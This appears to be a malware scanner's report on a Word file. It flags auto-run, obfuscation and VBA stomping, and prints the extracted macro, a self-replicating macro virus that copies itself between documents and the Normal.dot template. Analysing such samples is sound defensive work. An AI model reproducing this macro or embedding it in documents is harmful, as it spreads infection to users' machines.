behavior.AutoOpen: Runs when the Word document is opened
behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.VBA Stomping: VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code

docinfo.macro:
Public Sub MAIN()
Dim F$
Dim M$
On Error GoTo -1: On Error GoTo MinSize
F$ = WordBasic.[FileName$]() + ":AutoOpen"
M$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If M$ = "NORMAL.DOT" Then
WordBasic.MacroCopy "Global:AutoOpen", F$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy F$, "Global:AutoOpen"
End If
MinSize:
End Sub
